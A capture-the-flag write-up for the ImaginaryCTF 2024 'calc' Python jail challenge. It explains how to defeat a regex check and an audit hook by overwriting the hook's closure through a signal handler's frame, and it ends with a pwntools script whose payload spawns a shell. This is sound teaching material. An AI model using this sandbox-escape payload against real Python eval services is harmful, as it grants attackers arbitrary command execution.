# ImaginaryCTF 2024 calc

```python
#!/usr/bin/env python3
from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()


if __name__ == "__main__":
    expr = input("Math expression: ")
    if len(expr) <= 200 and match(r"[0-9+\-*/]+", expr):
        print(safe_eval(_exit, expr))
    else:
        print("Do you know what is a calculator?")
```

Requirements:

1. Input is a expression: Use list comprehension to execute multiple statements
2. Input should match regex: Use `1,` to bypass since it is not a full match
3. Audit hook: Add signal handler, raise signal and change content of the audit hook to bypass

This writeup is inspired by [ICTF 2024 - All PyJails 『ANY %』on Shy blog](https://blog.antoine.rocks/%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups/ictf%202024%20-%20all%20pyjails/). It is nicely written, you are strongly encouraged to read it.

If we launch shell directly, the audit hook will immediately kill the process.

The audit hook is implemented in `def hook(*a):`:

```python
def safe_eval(exit, code):
    def hook(*a):
        exit(0)
```

It captures `exit` from the outer function. It is stored in `__closure__`:

```python
import os
def safe_eval(exit, code):
    def hook(*a):
        exit(0)
    
    # prints (<cell at 0x1042321c0: builtin_function_or_method object at 0x104169400>,)
    print(hook.__closure__[0])

safe_eval(os._exit, "")
```

We can override the captured `exit` to `print`:

```python
import os
def safe_eval(exit, code):
    def hook(*a):
        exit(0)
    
    hook.__closure__[0].__setattr__("cell_contents", print)
    # print(0) instead of exit(0)
    hook()

safe_eval(os._exit, "")
```

Now the audit hook effectively does nothing. The next problem is, how do we access `hook`? It is a local function to `safe_eval`, so we cannot access it from outside, unless:

1. We can get a frame via raising an exception and catching it, as [audited - pwn, 263pts writeup by rickastley / the cr0wn](https://ctftime.org/writeup/25467); however, we cannot use try-except in an expression due to `compile(..., "eval")`
2. We can get a frame by registering a signal handler and raising the signal, as [[ICTF 2024 - All PyJails 『ANY %』on Shy blog](https://blog.antoine.rocks/%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups/ictf%202024%20-%20all%20pyjails/)]

The second method is used:

1. Get signal module via `s = __import__["sys"].modules["_signal"]`
2. Register signal handler and replace the `exit` function in `hook`: `s.signal(1, lambda num, frame: frame.f_back.f_locals["hook"].__closure__[0].__setattr__("cell_contents", print))`, here `frame` refers to the frame of `dummy`, so `frame.f_back` belongs to `safe_eval`, and we can find `hook` from `frame.f_back.f_locals["hook"]`
3. Raise the signal handle to mute the audit hook: `s.raise(1)`
4. Eventually get shell: `__import__("os").system("sh")`

Attack script:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "calc.py"])
p.sendline(
    (
        "1,"
        + '[s:=__import__("sys").modules["_signal"],'
        + 's.signal(1, lambda num, frame: frame.f_back.f_locals["hook"].__closure__[0].__setattr__("cell_contents", print)),'
        + "s.raise_signal(1),"
        + '__import__("os").system("sh")]'
    ).encode()
)
p.interactive()
```
